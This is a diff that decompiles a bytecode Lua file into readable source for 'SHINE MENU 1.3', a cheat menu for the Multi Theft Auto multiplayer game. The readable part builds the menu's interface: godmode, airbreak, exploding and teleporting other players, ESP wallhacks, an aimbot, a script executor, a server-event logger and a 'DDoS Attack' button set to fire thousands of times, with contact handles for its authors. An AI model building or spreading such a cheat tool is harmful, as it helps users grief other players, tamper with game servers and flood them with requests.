@@ -1,357 +1,1457 @@
-LuaQ     @shine.lua           $·	  
-€  J   	@€€J   	@    
-À  J   	@ ‚J   	@€‚J   	@ ƒÀ  
-À  J   	@ ‚J   	@€‚J   	@ ƒÀ @ A€ À Á  A A ‚€ €€  À E  ‚   @€  E  @ Á€ @ À A  @   E  @ Á€ @   A@ € ÁÀ  AA ‚€ Å € À € EÀ À Á   @€€ A@ À Á 	 A	 B€ … €€@ À	 A 
- …@ €€€	    @@ E€
- À
- Á  A AÁ  Â€ ‚	 \€ 	@€”À E   F@À F@Ê   @€  E   F@À F@Ê @ Á€ @    @@ E€
- @ Á  Á AÁ 
- Â€ ‚	 \€ 	@ ™À E   F@À F€Ì   @€  E   F@À F€Ì @ Á€ @    @@ E€
- €
- Á  A AÁ Á
- Â€ ‚	 \€ 	@€šÀ E   F@À F@Í   @€  E   F@À F@Í @ Á€ @    @@ E€
- @ Á@ Á AÁ  Â€ ‚	 \€ 	@ œÀ E   F@À F Î   @€  E   F@À F Î @ Á€ @    @@ E€
- À
- Á@ Á AÁ  Â€ ‚	 \€ 	@€À E   F@À FÀÎ   @€  E   F@À FÀÎ @ Á€ @    @@ E€
- €
- Á@ A AÁ  Â€ ‚	 \€ 	@€žÀ E   F@À F@Ï   @€  E   F@À F@Ï @ Á€ @    @@ E€
- @ Á  Á AÁ A Â€ ‚	 \€ 	@€ŸÀ E   F@À FÀÏ   @€  E   F@À FÀÏ @ Á€ @    @@ E€
- À
- Á  A AÁ Á Â€ ‚	 \€ 	@ ¡À E   F@À F€Ð   @€  E   F@À F€Ð @ Á€ @    @@ E€
- €
- Á  A AÁ A Â€ ‚	 \€ 	@ ¢À E   F@À F Ñ   @€  E   F@À F Ñ @ Á€ @    @@ E€
- À Á@ Á AÁ  Â€ ‚	 \€ 	@ £À E   F@À F€Ñ   @€  E   F@À F€Ñ @ Á€ @    @@ E€
- À Á  Á AÁ  Â€ ‚	 \€ 	@€¤À E   F@À F@Ò   @€  E   F@À F@Ò @ Á€ @    @@ E€
- À Á  Á AÁ  Â€ ‚	 \€ 	@€¥À E   F@À FÀÒ   @€  E   F@À FÀÒ @ Á€ @    @@ E€
- € Á@ Á AÁ Á Â€ ‚	 \€ 	@€¦À E   F@À F@Ó   @€  E   F@À F@Ó @ Á€ @ À	 A@ …@ €€  À A@   Á@  B€ … €€€ À E€   Á@ @    @@ E€
- À Á  A AA  Â€  \€ 	@ ­À E   F@À F€Ö   @€  E   F@À F€Ö @ Á€ @    @@ E€
- À Á  A AA A Â€  \€ 	@€¯À E   F@À FÀ×   @€  E   F@À FÀ× @ Á€ @    @@ E€
- À Á@ A AA Á Â€  \€ 	@ ±À E   F@À F€Ø   @€  E   F@À F€Ø @ Á€ @   A@   Á€ Á A ‚€ Å €   À E    @€€ E  À Á   @€   @@ E€
- € Á  Á AA  Â€  \€ 	@€´À E   F@À F@Ú   @€  E   F@À F@Ú @ Á€ @    @@ E€
- @	 Á  Á AA  Â€  \€ 	@€¶À E   F@À F@Û   @€  E   F@À F@Û @ Á€ @    @@ E€
- € Á@ Á AA  Â€  \€ 	@€·À E   F@À FÀÛ   @€  E   F@À FÀÛ @ Á€ @    @@ E€
- @	 Á@ Á AA  Â€  \€ 	@€¸À E   F@À F@Ü   @€  E   F@À F@Ü @ Á€ @    @@ E€
- € Á  Á AA  Â€  \€ 	@€¹À E   F@À FÀÜ   @€  E   F@À FÀÜ @ Á€ @    @@ E€
- @	 Á  Á AA  Â€  \€ 	@€ºÀ E   F@À F@Ý   @€  E   F@À F@Ý @ Á€ @    @@ E€
- € Á  Á AA  Â€  \€ 	@€»À E   F@À FÀÝ   @€  E   F@À FÀÝ @ Á€ @    @@ E€
- @	 Á  Á AA  Â€  \€ 	@€¼À E   F@À F@Þ   @€  E   F@À F@Þ @ Á€ @    @@ E€
- € Á  Á AA A Â€  \€ 	@€½À E   F@À FÀÞ   @€  E   F@À FÀÞ @ Á€ @    @@ E€
- @	 Á  Á AA Á Â€  \€ 	@ ¿À E   F@À F€ß   @€  E   F@À F€ß @ Á€ @ À	 A@  …@ €€   À  A@  ! Á@! ! AÁ! ‚€ Å  € €  €
- A@" €" ÁÀ" Á A# ‚€ Å  €  " À E "   @€  E " @ Á€ @    @@ E€
- @" Á  Á" AÁ # Â€   \€ 	@€ÆÀ E   F@À F@ã   @€  E   F@À F@ã @ Á€ @    @@ E€
- @" Á ! Á" AÁ $ Â€   \€ 	@€ÇÀ E   F@À FÀã   @€  E   F@À FÀã @ Á€ @ À	 A€$ …@ €€@$ À  €A E  @ Á  Á A! Á! Â€ B$ \€ 	@€”À  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁFBÊ\€€	@€”À   A E  À Á  A
- AA
- Á% Â€ Â  ‚ABJ\€ 	@€”À EÀ  F Á F@Ê   @€ & EÀ  F Á F@Ê @& @€À  €A E  @ Á€& A A! Á! Â€ B$ \€ 	@ ™À  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁF‚Ì\€€	@ ™À   A E  À Á  A
- AA
- Á& Â€ Â  ‚A‚L\€ 	@ ™À EÀ  F Á F€Ì   @€ & EÀ  F Á F€Ì @& @€À  €A E  @ Á@ Á A! Á! Â€ B$ \€ 	@€šÀ  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁFBÍ\€€	@€šÀ   A E  À Á  A
- AA
- ' Â€ Â  ‚ABM\€ 	@€šÀ EÀ  F Á F@Í   @€ & EÀ  F Á F@Í @& @€À  €A E  @ Á@' Á A! Á! Â€ B$ \€ 	@ œÀ  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁFÎ\€€	@ œÀ   A E  À Á  A
- AA
- ' Â€ Â  ‚AN\€ 	@ œÀ EÀ  F Á F Î   @€ & EÀ  F Á F Î @& @€À  €A E  @ Á  Á A! Á! Â€ B$ \€ 	@€À  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁFÂÎ\€€	@€À   A E  À Á  A
- AA
- Á' Â€ Â  ‚AÂN\€ 	@€À EÀ  F Á FÀÎ   @€ & EÀ  F Á FÀÎ @& @€À  €A E  @ Á ( A% A! Á! Â€ B$ \€ 	@€žÀ  @A EÀ$   Á % A% A% Á! Â  € EÂ  F‚ÁFBÏ\€€	@€žÀ   A E  À Á  A
- AA
- A( Â€ Â  ‚ABO\€ 	@€žÀ EÀ  F Á F@Ï   @€ & EÀ  F Á F@Ï @& @€À €A E  €( Á  Á A! Á! Â€ B$ \€ 	@€”À @A EÀ$   Á % A% A% Á! Â  € EÂ F‚ÁFBÊ\€€	@€”À  A E  À Á  A
- AA
- Á( Â€ Â ‚ABJ\€ 	@€”À EÀ F Á F@Ê   @€ & EÀ F Á F@Ê @& @€À €A E  €( Á€& Á A! Á! Â€ B$ \€ 	@ ™À @A EÀ$   Á % A% A% Á! Â  € EÂ F‚ÁF‚Ì\€€	@ ™À  A E  À Á  A
- AA
- ) Â€ Â ‚A‚L\€ 	@ ™À EÀ F Á F€Ì   @€ & EÀ F Á F€Ì @& @€À €A E  €( Á@ Á A! Á! Â€ B$ \€ 	@€šÀ @A EÀ$   Á % A% A% Á! Â  € EÂ F‚ÁFBÍ\€€	@€šÀ  A E  À Á  A
- AA
- A) Â€ Â ‚ABM\€ 	@€šÀ EÀ F Á F@Í   @€ & EÀ F Á F@Í @& @€À) A@ @ Á   B€ ‚€ ÅA$ € €)   A@ @* Á  ! A* ‚€ ÅA$ €  * À E *   @€€ E * À Á   @€À* E * @& Â   @  & E * @& @€À	 A@+ …@ €€ + À+ A@ €& Á , A, A, ‚€ Å+ € €+   E€+ @ Á€ @   A@ € Á , - AA- ‚€ Å+ € À, À EÀ,   @€€ EÀ, À Á   @€À* EÀ, @& Â   @  & EÀ, @& @€   @@ E€
- @ ÁÀ- Á A& . Â€ + \€ 	@ ÛÀ E   F@À F€í   @€  E   F@À F€í @ Á€ @   A@ €. ÁÀ. - A/ ‚€ Å+ € @. À E@.   @€€ E@. À Á   @€À* E@. @& Â   @  & E@. @& @€   @@ E€
- @ Á€/ Á AÁ- Á/ Â€ + \€ 	@€ÞÀ E   F@À F@ï   @€  E   F@À F@ï @ Á€ @    @@ E€
-  , Á€/ Á AÁ- A0 Â€ + \€ 	@ àÀ E   F@À F ð   @€  E   F@À F ð @ Á€ @   A@   ÁÀ. - AÁ0 ‚€ Å+ € €0 À E€0   @€€ E€0 À Á   @€À* E€0 @& Â   @  & E€0 @& @€   @@ E€
- @ Á@1 Á AÁ- 1 Â€ + \€ 	@ âÀ E   F@À F ñ   @€  E   F@À F ñ @ Á€ @    @@ E€
-  , Á@1 Á AÁ- 2 Â€ + \€ 	@€ãÀ E   F@À FÀñ   @€  E   F@À FÀñ @ Á€ @    @@ E€
-  , Á€2 Á AÁ- Á2 Â€ + \€ 	@€äÀ E   F@À F@ò   @€  E   F@À F@ò @ Á€ @    @@ E€
- @ Á€2 Á AÁ- A3 Â€ + \€ 	@ æÀ E   F@À F ó   @€  E   F@À F ó @ Á€ @ À+ AÀ3 €& Á - A, AÁ! ‚€ Å+ € €3   E€3 @ Á€ @  4 E€3 @
- @€  AÀ3 € Á , - A4 ‚€ Å+ € @4 À E@4   @€€ E@4 À Á   @€À* E@4 @& Â   @  & E@4 @& @€   @@ E€
-  5 Á€&  AA, A5 Â€ + \€ 	@€éÀ E   F@À FÀô   @€  E   F@À FÀô @ Á€ @    @@ E€
- À3 Á€ , A& Á5 Â€ + \€ 	@ ëÀ E   F@À F€õ   @€  E   F@À F€õ @ Á€ @    @@ E€
- À3 Á@6 , A& 6 Â€ + \€ 	@ ìÀ E   F@À F ö   @€  E   F@À F ö @ Á€ @    @@ E€
- À3 Á 7 , A& A7 Â€ + \€ 	@€íÀ E   F@À FÀö   @€  E   F@À FÀö @ Á€ @    @@ E€
- À3 ÁÀ7 , A& 8 Â€ + \€ 	@ ïÀ E   F@À F€÷   @€  E   F@À F€÷ @ Á€ @    €@ E  @" Á€ Á" AA8 8 Â€ + \€ 	@€”À E   F€À F@Ê   @€€ E   F€À F@Ê À Á   @€À* E   F€À F@Ê @& Â   @ À	 A 9 …@ €€À8   A@   Á , A% A9 ‚€ ÅÁ8 € @9 À E@9   @€€ E@9 À Á   @€À* E@9 @& Â   @  & E@9 @& @€À+ A@ € ÁÀ % A: ‚€ ÅÁ8 € À9 @: EÀ9 ‚ € @€  EÀ9 @ Á€ @   AÀ: À Á@ A% A; ‚€ ÅÁ8 € €: À E€:   @€€ E€: À Á   @€ & E€: @& @€  AÀ: À Á@ A% A; ‚€ ÅÁ8 € @; À E@;   @€€ E@; À Á   @€ & E@; @& @€À; E  ‚   @€€< À€ G@<  < $   À< À< E < @= Á€= Á= AA
- €  = $@   > $€  @> 
-   dÀ      G€> EÀ>  ? Å@? Ü€€ $     B€ ? \@ E€> À? Ê €Á A  â@€\@€J   Š  	Á @ A@ A@ Á@ ÁA BA A‚A ÂA ÁB CB AƒB ÃB ÁC DC A„C ÄC ÁD ED A…D ¢@€	ÅÀD E dA É@ä€      € Ç@E ÅÀ> ? EE ¤Á   € Ü@ ä  ÇÀE ä@ Ç F Å@F F EÁF …Á9 \   AG …F Ü@ ä€ Ç@G äÀ Ç€G Ê   ÇÀG ÅÀG H J  AH Á IÁH ÁÁH IÁÉ@ä  Ç I ä@ Ç@I Á   A  Ã€ŠÂ Á‚I   ‰ƒÁÂI ƒ ‰ƒÁJ Ã: ‰ƒÁBJ ƒ ‰ƒÁ‚J € ‰ƒÁÂJ Ã ‰ƒÁK Ã ‰ƒÁBK Ã: ‰ƒÁ‚K ÃK ‰ƒÁL CH ‰ƒÁBL ƒH ‰ƒÁ‚L ÃL ‰ƒÁM CM ‰ƒÁ‚M ÃM ‰ƒÁN CN ‰ƒÁ C? ƒ€ EƒN \ƒ€ …ÃN À ¤ƒ   €ã  äÃ   €           €     €     €$   €     €   dD      €   GO d„      €  €     €  €     €   GDO dÄ G„O d   €GÄO dD   €GP EP \D€ d„ GDP EDP \D€ EÄ> „P Å„E $Å \D EÄ> ÄP Å„E $ \D EÄ> Q À€$E \D EÄ> DQ À€$… \D dÄ G„Q d GÄQ dD   €GR d„   €GDR E„R ÄR äÄ 
- AS ES "E \D AÄS G„S ET …„) Å„S ET Î…	…T Ï…	\D€EÄT …* ÁU EU A…U E
-E…S … AÅU ÕD…	\D€EÄ> V Å„) $ B  \D€JD  „ ÊD   JÅ  E ÊE  Æ JF  F Â  IÆ
-ÉEIÅ1 ÊE  Æ1 JF  F2 Â  IÆ
-ÉEIÅE
- ÊE  † JF  F
- Ê†  ‡V JG  ÇV ÊG  W JH  HW Â  IÈÉGIÇÉF‡W JG  ÇW ÊG  X JH  HX Â  IÈÉGIÇÉFIÆ
-ÉEIÅÉD
-IÄ	GDV dD   €G„X d„ GÄX dÄ   €GY d	   €GDY dD	   €G„Y d„	   €GÄY dÄ	   €GZ d
-   €GDZ dD
- G„Z d„
-   €GÄZ dÄ
- G[ E„< \Ä€ Ê„  … JE€ Š…  ÁE[ ÆS ‰†Á…[ Æ[ A† † ÁÆ: † ‰†Á\ Æ[ A† † ÁÆ: † I†bE€ ÉD
-… JE€Š…  ÁE[ ÆS ‰†Á…[ Æ[ A† † ÁÆ: † ‰†Ê…  F[ AFT ÉE†[ EÆ[ † Á† G\ \† ÉE
-†  AF[ †\ 	††A†[ …Æ[ Á† ‡ AÇ: œ† 	††A\ …Æ[ Á† ‡ AÇ: œ† I…†bE€ÉD
-$   €	Å\ … dE G] d…   €GE] dÅ   €E
- ä    Ç…] Å…] ÜE€ ÅÅ> Æ] E†E ¤F   €  €
-   
-   ÜE ä… Ç^ ÅÅ> F^ E†E …^ ÜE ÅÅ> †^ EF? \†€ ¤Æ   €ÜE Ê 1 J€_ ÁF_ ‡ bF€ÉEÆ1 J€†_ ÁÆ_ ‡ bF€ÉEF2 J€` ÁF` ‡ bF€ÉE3 J€†` ÁÆ` G bF€ÉEÇÅ^ Á1 3 AF
- à€ÅÆ> ‡^ EG? \‡€ ¤
-    
-  €ÜF £  ßEý € „  
-   ShineMenu    button    label    Esp    Text    Tik    Label    EspVehicle    ShineBG    guiCreateWindow ìQ¸…ëÑ?333333Ó?)\Âõ(Ü?®GázÞ?   SHINE MENU    guiWindowSetSizable    guiSetProperty    CaptionColour 	   FFFF0000    guiSetInputMode    no_binds_when_editing    AlwaysOnTop    True 
-   ShineInfo    guiCreateLabel {®Gáz”?¸…ëQ¸®?
-×£p=
-ï?¸…ëQ¸¾?Š   SHINE MENU - Version 1.3 | Telegram: @ABUSERMTA - Discord: https://discord.gg/DfnHaDSX
+ShineMenu = {
+    button = {},
+    label = {}
+}
+Esp = {
+    Text = {},
+    Tik = {},
+    Label = {}
+}
+EspVehicle = {
+    Text = {},
+    Tik = {},
+    Label = {}
+}
+ShineBG = guiCreateWindow(0.28, 0.30, 0.44, 0.47, "SHINE MENU", true)
+guiWindowSetSizable(ShineBG, false)
+guiSetProperty(ShineBG, "CaptionColour", "FFFF0000")
+guiSetInputMode("no_binds_when_editing")
+guiSetProperty(ShineBG, "AlwaysOnTop", "True") 
 
-Online Players: 85 | Interior: 65 | Dimension: 72    guiLabelSetColor      ào@        
-   MainTabShine    guiCreateTabPanel š™™™™™É?¸…ëQ¸î?¤p=
-×£è?
-   PlayerTab 
-   guiCreateTab    Player       ð?   guiCreateButton ffffffÖ?š™™™™™Ù?×£p=
-×Ó?   Revive    guiSetFont    default-bold-small    NormalTextColour        @333333Ã?   Suicide       @q=
-×£på?   Give/Take Armor       @{®GázÄ?   Fast Sprint       @	   Airbreak       @   Freecam       @{®Gázä?
-   Start Engine        @   Freeze/Unfreeze       "@   Godmode       $@
-×£p=
-Ç?   Fast Reload       &@   Max Health       (@   Repair Vehicle       *@R¸…ëQà?   Vehicle Fly 	   TrollTab    Troll    PlayersGrid    guiCreateGridList {®Gáz¤?q=
-×£pÍ?®Gázî?   guiGridListAddColumn    Select Player 333333ë?      ,@¤p=
-×£Ð?áz®GáÚ?¸…ëQ¸Î?   Spectate Player       .@×£p=
-×ã?   Explode Player       0@   Teleport Player    Line ¤p=
-×£à?¸…ëQ¸ž?q=
-×£pí?Q   |
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-|
-       1@ìQ¸…ëá?R¸…ëQÈ?   Explode Near Players       2@   Pull Vehicles       3@   Bomb Click       4@   Explode Near Empty Vehicles       5@   Teleport Click       6@   Fire Yourself       7@   Position Troll       8@   Unlock Vehicles       9@=
-×£p=ê?   Engine Fire       :@
-   Add Nitro    ExecutorTab 	   Executor 
-   ExecutorMemo    guiCreateMemo 
-×£p=
-·?ÍÌÌÌÌÌä?Âõ(\ê?       ExecuteScript ®Gázæ?
-×£p=
-ç?Âõ(\Ò?   Execute Script       ;@   Trigger Logger       <@   Get All ElementData    VisualsTab    Visuals    guiCreateCheckBox ¤p=
-×£À?Ãõ(\ÂÅ?ö(\Âõè?   You    guiLabelSetVerticalAlign    center ìQ¸…ëÁ?
-   Esp Skeleton    Esp Box Ãõ(\ÂÕ?	   Esp Line 	   Esp Name Ház®Gá?
-   Esp Distance )\Âõ(Ì?
-   Vehicle Line 
-   Vehicle Name    Vehicle Distance    EspDistanceScroll    guiCreateScrollBar    EspDistanceLabel ¸…ëQ¸æ?"   Current Esp Distance Limit: 500 M    guiLabelSetHorizontalAlign    MiscTab    Misc 
-   DDosValue    guiCreateEdit áz®GáÊ?š™™™™™¹?   5000 
-   DDosLabel {®Gáz´?   DDoS Attack       =@)\Âõ(¼?   Run!    TeleportOptionsLabel 
-×£p=
-×?®Gáz®×?   Teleport Options:       >@¸…ëQ¸Þ?   Save Position       ?@	   Teleport 
-   PopularTp    Popular Locations:       @@®Gáz®ç?
-   Grove Street      €@@   Los Santos       A@×£p=
-×ë?   San Fierro      €A@
-   Las Venturas    SkinID q=
-×£pÝ?   guiEditSetMaxLength    SkinChangeLabel 
-   Skin Changer       B@š™™™™™á?   Set      €B@   Remove FPS Limit       C@ÍÌÌÌÌÌÜ?   Clear Chat Box      €C@)\Âõ(ä?
-   FPS Boost       D@š™™™™™é?
-   Trash Aimbot )\Âõ(ì?å   WARNING:
+ShineInfo = guiCreateLabel(0.02, 0.06, 0.97, 0.12, "SHINE MENU - Version 1.3 | Telegram: @ABUSERMTA - Discord: https://discord.gg/DfnHaDSX\n\nOnline Players: 85 | Interior: 65 | Dimension: 72", true, ShineBG)
+guiLabelSetColor(ShineInfo, 255, 0, 0)
+MainTabShine = guiCreateTabPanel(0.02, 0.20, 0.96, 0.77, true, ShineBG)
 
-Trash Aimbot
-Have Some Bugs!
+PlayerTab = guiCreateTab("Player", MainTabShine)
 
-Skin Changer Is Client Side
-( Only You Can See New Skin )
+ShineMenu.button[1] = guiCreateButton(0.35, 0.40, 0.31, 0.20, "Revive", true, PlayerTab)
+guiSetFont(ShineMenu.button[1], "default-bold-small")
+guiSetProperty(ShineMenu.button[1], "NormalTextColour", "FFFF0000")
+ShineMenu.button[2] = guiCreateButton(0.02, 0.40, 0.15, 0.20, "Suicide", true, PlayerTab)
+guiSetFont(ShineMenu.button[2], "default-bold-small")
+guiSetProperty(ShineMenu.button[2], "NormalTextColour", "FFFF0000")
+ShineMenu.button[3] = guiCreateButton(0.67, 0.40, 0.31, 0.20, "Give/Take Armor", true, PlayerTab)
+guiSetFont(ShineMenu.button[3], "default-bold-small")
+guiSetProperty(ShineMenu.button[3], "NormalTextColour", "FFFF0000")
+ShineMenu.button[4] = guiCreateButton(0.02, 0.16, 0.15, 0.20, "Fast Sprint", true, PlayerTab)
+guiSetFont(ShineMenu.button[4], "default-bold-small")
+guiSetProperty(ShineMenu.button[4], "NormalTextColour", "FFFF0000")
+ShineMenu.button[5] = guiCreateButton(0.35, 0.16, 0.15, 0.20, "Airbreak", true, PlayerTab)
+guiSetFont(ShineMenu.button[5], "default-bold-small")
+guiSetProperty(ShineMenu.button[5], "NormalTextColour", "FFFF0000")
+ShineMenu.button[6] = guiCreateButton(0.67, 0.16, 0.31, 0.20, "Freecam", true, PlayerTab)
+guiSetFont(ShineMenu.button[6], "default-bold-small")
+guiSetProperty(ShineMenu.button[6], "NormalTextColour", "FFFF0000")
+ShineMenu.button[7] = guiCreateButton(0.02, 0.64, 0.15, 0.20, "Start Engine", true, PlayerTab)
+guiSetFont(ShineMenu.button[7], "default-bold-small")
+guiSetProperty(ShineMenu.button[7], "NormalTextColour", "FFFF0000")
+ShineMenu.button[8] = guiCreateButton(0.35, 0.64, 0.31, 0.20, "Freeze/Unfreeze", true, PlayerTab)
+guiSetFont(ShineMenu.button[8], "default-bold-small")
+guiSetProperty(ShineMenu.button[8], "NormalTextColour", "FFFF0000")
+ShineMenu.button[9] = guiCreateButton(0.67, 0.64, 0.31, 0.20, "Godmode", true, PlayerTab)
+guiSetFont(ShineMenu.button[9], "default-bold-small")
+guiSetProperty(ShineMenu.button[9], "NormalTextColour", "FFFF0000")
+ShineMenu.button[10] = guiCreateButton(0.18, 0.16, 0.15, 0.20, "Fast Reload", true, PlayerTab)
+guiSetFont(ShineMenu.button[10], "default-bold-small")
+guiSetProperty(ShineMenu.button[10], "NormalTextColour", "FFFF0000")
+ShineMenu.button[11] = guiCreateButton(0.18, 0.40, 0.15, 0.20, "Max Health", true, PlayerTab)
+guiSetFont(ShineMenu.button[11], "default-bold-small")
+guiSetProperty(ShineMenu.button[11], "NormalTextColour", "FFFF0000")
+ShineMenu.button[12] = guiCreateButton(0.18, 0.64, 0.15, 0.20, "Repair Vehicle", true, PlayerTab)
+guiSetFont(ShineMenu.button[12], "default-bold-small")
+guiSetProperty(ShineMenu.button[12], "NormalTextColour", "FFFF0000")
+ShineMenu.button[13] = guiCreateButton(0.51, 0.16, 0.15, 0.20, "Vehicle Fly", true, PlayerTab)
+guiSetFont(ShineMenu.button[13], "default-bold-small")
+guiSetProperty(ShineMenu.button[13], "NormalTextColour", "FFFF0000")
 
-Set DDoS Attack Times
-Between 
-5,000 ~ 50,000 Times
-If You Get Crash!
+TrollTab = guiCreateTab("Troll", MainTabShine)
 
-Clear Chat Box Only Clear
-Your Chat Box
-Enjoy SHINE 1.3 :)    SettingsTab 	   Settings 
-   KeybindLabel    Open Menu Key:    Keybind    num_dec    guiEditSetReadOnly    InfoDevelopers š™™™™™©?#   Telegram: @AbuserMTA | @AbolMaster    InfoDevelopersDiscord !   discord.gg/C-RAZY | Mr.XyZz#8193    guiSetVisible    screenX    screenY    guiGetScreenSize    reMap    responsiveMultipler       @      ž@      è?   resp    respc    addNotification    addEventHandler    onClientRender    getRootElement    low-999999999 (   SHINE 1.3 Has Been Loaded Successfully.    Linear    InQuad    OutQuad 
-   InOutQuad 
-   OutInQuad 
-   InElastic    OutElastic 
-   InOutElastic 
-   OutInElastic    InBack    OutBack 
-   InOutBack 
-   OutInBack 	   InBounce 
-   OutBounce    InOutBounce    OutInBounce 
-   SineCurve    CosineCurve    table    find    animate    root    isEventHandlerAdded    toggleShine    bindKey 	   tostring    guiGetText    down    fastSprint    fastReload    Fly    speedMultipliers    lshift    lalt       Ð?
-   toggleFly    rotationFromCamera    invertMouseLook    normalMaxSpeed 
-   slowMaxSpeed 
-   fastMaxSpeed    smoothMovement 
-   acceleration    decceleration    mouseSensitivity 
-   maxYAngle      €g@
-   key_fastMove 
-   key_slowMove    key_forward    w 
-   key_backward    s 	   key_left    a 
-   key_right    d    getLocalPlayer    getKeyState    setFreecamEnabled    setFreecamDisabled    toggleFreecam    toggleGodmode    refreshInformation    refreshPlayersList    onClientPlayerJoin    onClientPlayerQuit    onClientElementDimensionChange    onClientElementInteriorChange    guiGridListGetSelectedItemText    isVehicleEmpty    toggleBombClick    toggleTeleportClick 
-   addDebugHook    preFunction    triggerServerEvent    triggerLatentServerEvent    EspDistance       i@   guiScrollBarSetScrollPosition       Y@     ˆ³@   guiSetText    Current Esp Distance Limit:     math    floor     M    onClientGUIScroll    boneRelations      €I@      J@     €J@      K@     €D@      E@     €E@      F@
-   drawSkeleton 
-   drawBones    drawBox 	   drawLine    dxDrawTextOnElement 	   drawName 
-   drawDistance    drawLineVehicle    drawNameVehicle    drawDistanceVehicle    isPedAiming 	   distance 	   multiple    Vector3    default áz®Gáª?      I@   calculateDepthBuffer 
-   findRotation    getPlayersOnScreen    scaleAspectRatio    onClientPreRender    changeKeybind    onClientKey    onClientGUIClick 
-   Locations      |£@     šÀ     È—@      šÀ     x—À     Œ@     tš@     °–@5          "       MA  Á NA OLÁ€^  €            !  !  !  !  !  !  !  "              $  &       E   N@  ^   €       responsiveMultipler        %  %  %  &              '  )       E   F@À …€  Ž€  ]  ^    €       math    ceil    responsiveMultipler        (  (  (  (  (  (  )              ,  @   	P   @    € € ƒ  ‡   Z   € €„   ‰@€€€€„   Ê €  AÁ  Á  â@€‰À€€…  †@AÅ€    AÁ  Ü€  AA Á Á  œ€  Œ€BÀ    	Á€…  E FAÁ…A ÁÁ  œ€ŽCŒÁCÅ B Ü \  	A†  EÁ MÁ€OÅ	A‰  E \€ 	AŠ  D  FAÅLÆ    €…A À  œ šA    €Á  ŽFL	A‹  	Ç  J€ €  bA€ 	AŽ €       msg2    color      ào@           math    max    dxGetTextWidth 333333ë?
-   default-bold           4@
-   tileWidth    tileHeight    dxGetFontHeight       ð?      $@   respc       D@	   tilePosX    screenX        @
-   moveDownTick 
-   getTickCount    moveUpTick      @@   utfLen      @_@   state    message     P   -  -  .  0  0  1  1  2  2  2  4  4  4  4  4  4  4  6  6  6  6  6  6  6  6  6  6  6  6  6  6  7  8  8  9  9  9  9  9  9  9  9  9  9  9  9  9  9  :  :  :  :  :  <  <  <  <  =  =  =  =  =  =  =  =  =  =  =  =  =  =  =  >  >  ?  ?  ?  ?  ?  @              C  a    £         À €    @ @    € € @  €€ D   F€À „   †À@’  Á    AA  @€  A  @€Á A „  †Á@’ Á  AB  Ä  ÆBÁÍÂ Ï‚ÂÃ Á€€ €À  @€  A  @€  A
- BEÁ  ÁA  A „  †Â@’ Á   AÃ \Á€€  À € „@ €D  IC€A @€ € Ä  ÆÃ  Â@EÂ B ÁB C NÃ ˆ\‚€‚€ A€A LAÄ ŒADÄ  ÆÃÍÄ  Â@
-‚DEÂ Â ÁÂ Ã NÃ Š\‚€‚€ A€  AA
- D  FÁ„  †AAMA B €EA €€ Ä  ÆÁÀÌÁÍAÄ  ‚CM„BAB …Â Ä  ÆBÅÆÂ  CECDD  FCÅFƒÅŽÃ€‹œ‚€Â€ \A€E „  †AF†BÀ€   D  F‚ÃLB‚ „  †Â@Œ‚ÅÂ Ã AÃ Ã ÎÃÅÜ‚€ƒ AÃ  Á € B  ‚€ \A  €       state 
-   getTickCount 	   tilePosX    tileHeight         
-   moveDownTick    moveUpTick    interpolateBetween       ð?      I@     @@   OutQuad     dxDrawRectangle 
-   tileWidth    tocolor       i@       @      @      9@     àe@   color       @     ào@   dxDrawText    message 333333ë?
-   default-bold    center     £   D  D  D  D  D  D  D  E  H  H  I  I  J  J  J  K  M  M  M  M  M  M  M  M  N  N  N  N  N  N  N  N  N  N  N  N  N  N  N  N  N  N  O  O  O  O  P  P  P  P  Q  Q  Q  Q  Q  Q  Q  Q  Q  Q  Q  Q  Q  Q  S  S  T  T  X  X  X  X  X  X  X  X  X  X  X  X  X  X  X  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  Y  [  [  [  [  [  [  [  [  [  ]  ]  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  ^  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  `  a              f  m       …   À   œ € €@   €^ ¡€  €þ‚   ž   €       ipairs        g  g  g  g  h  h  i  g  j  l  l  m              n  v   n   …  ÅA     Ü W€À  €ÂA  Â€ Â  EB  €  \‚  ‚œA€…  ÅA   € Ü W€À  €ÂA  Â€ B EB  €€ \‚  ‚œA€…  ÅA    Ü W€ÁÀ€ÅA    Ü €À@€Y€€ƒ €Ä  Ô€YÀ  €ÂA  Â€  œA€…  ÅA   €Ü W€À  €ÂA  Â€ B EB  €€\‚  ‚œA€…  ÅA    Ü W€Â  €ÂA  Â€ Â EB  € \‚  ‚œA€… †ACÄ€ 
-Â 	 ‡	B€‡E FBÄ„  À \‚€Z  @ €[B @ €D  F‚€	Bˆ	Â ‰E \‚€ 	B‚‰	Š	B‹œA€„€ ” ž  €       assert    type    number >   Bad argument @ 'animate' [expected number at argument 1, got     ] >   Bad argument @ 'animate' [expected number at argument 2, got     string       ð?8   Bad argument @ 'animate' [Invalid easing at argument 3] >   Bad argument @ 'animate' [expected number at argument 4, got  	   function @   Bad argument @ 'animate' [expected function at argument 5, got     table    insert    from    to    easing    find 	   duration    start 
-   getTickCount 	   onChange    onEnd     n   o  o  o  o  o  o  o  o  o  o  o  o  o  o  o  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  u  u  u  v              w  ‚    )      €€ E@  „   \ À€†ÀÅÁ  ÁAB B Æ‚ÁC AC †ÃÁƒ ÆÂÃÆCÂÜ€œA  †ÁÁÆÂŒÁ  À€… ÆÁÂœ  C@ €†ÁÂœA€ …A †CÄ    œA€a€  @÷ €    
